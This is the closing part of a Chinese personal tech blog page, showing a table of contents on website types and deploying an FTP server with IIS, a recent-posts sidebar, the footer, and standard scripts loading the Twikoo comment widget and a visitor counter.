class="toc-text">不同域名</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E7%B1%BB%E5%9E%8B"><span class="toc-number">16.</span> <span class="toc-text">网站类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99"><span class="toc-number">16.1.</span> <span class="toc-text">1.静态网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99"><span class="toc-number">16.2.</span> <span class="toc-text">2.动态网站</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E5%B8%83%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99"><span class="toc-number">16.2.1.</span> <span class="toc-text">发布动态网站</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FTP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">17.</span> <span class="toc-text">FTP服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-number">17.1.</span> <span class="toc-text">1.概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-FTP%E5%8D%8F%E8%AE%AE"><span class="toc-number">17.2.</span> <span class="toc-text">2.FTP协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8IIS%E9%83%A8%E7%BD%B2FTP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">17.3.</span> <span class="toc-text">3.使用IIS部署FTP服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E5%AE%89%E8%A3%85%E7%BB%84%E4%BB%B6"><span class="toc-number">17.3.1.</span> <span class="toc-text">1）安装组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E9%BB%98%E8%AE%A4FTP%E7%AB%99%E7%82%B9"><span class="toc-number">17.3.2.</span> <span class="toc-text">2）默认FTP站点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%EF%BC%89%E6%96%B0%E5%BB%BAFTP%E7%AB%99%E7%82%B9"><span class="toc-number">17.3.3.</span> <span class="toc-text">3）新建FTP站点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%EF%BC%89%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">17.3.4.</span> <span class="toc-text">4）匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%EF%BC%89%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">17.3.5.</span> <span class="toc-text">5）创建用户并验证</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/25/RE/" title="RE"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040526746.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RE"/></a><div class="content"><a class="title" href="/2022/05/25/RE/" title="RE">RE</a><time datetime="2022-05-25T08:12:41.000Z" title="发表于 2022-05-25 16:12:41">2022-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/25/linuxthree/" title="Linux三剑客的基础学习"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040526746.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux三剑客的基础学习"/></a><div class="content"><a class="title" href="/2022/05/25/linuxthree/" title="Linux三剑客的基础学习">Linux三剑客的基础学习</a><time datetime="2022-05-25T08:06:27.000Z" title="发表于 2022-05-25 16:06:27">2022-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/12/windows/" title="windows"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206151611273.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows"/></a><div class="content"><a class="title" href="/2022/05/12/windows/" title="windows">windows</a><time datetime="2022-05-12T05:01:26.000Z" title="发表于 2022-05-12 13:01:26">2022-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/20/helpby/" title="轻量的数据脱敏工具"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203201445517.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="轻量的数据脱敏工具"/></a><div class="content"><a class="title" href="/2022/03/20/helpby/" title="轻量的数据脱敏工具">轻量的数据脱敏工具</a><time datetime="2022-03-20T05:35:06.000Z" title="发表于 2022-03-20 13:35:06">2022-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/06/cs/" title="cs"><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202203040526746.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cs"/></a><div class="content"><a class="title" href="/2022/03/06/cs/" title="cs">cs</a><time datetime="2022-03-06T04:47:35.000Z" title="发表于 2022-03-06 12:47:35">2022-03-06</time></div></div></div></div></div></div></main><footer id="footer" style="background: rgba(255,255,255,.0)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Jughead YQQ</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome To 一名靓仔的 <a href="https://jason177.com">Blog</a>!<br>桂ICP备：没有喔宝贝</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo-aanpuy89j-xssqg.vercel.app/',
+      region: ''
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-aanpuy89j-xssqg.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
